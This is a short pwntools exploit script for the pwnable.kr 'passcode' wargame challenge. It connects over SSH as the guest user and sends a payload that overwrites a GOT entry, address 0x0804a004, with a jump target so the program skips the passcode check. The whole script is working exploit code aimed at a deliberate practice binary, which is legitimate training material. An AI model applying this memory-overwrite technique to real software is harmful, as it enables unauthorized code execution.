from pwn import *

# context.log_level = 'debug'


conn = ssh('passcode','pwnable.kr', 2222, 'guest')
r = conn.process(['./passcode'])
# r = process('./passcode')
r.sendline("a" * 96 + p32(0x0804a004)+'\n134514135\nthis\n')
r.interactive()








# r.interactive()




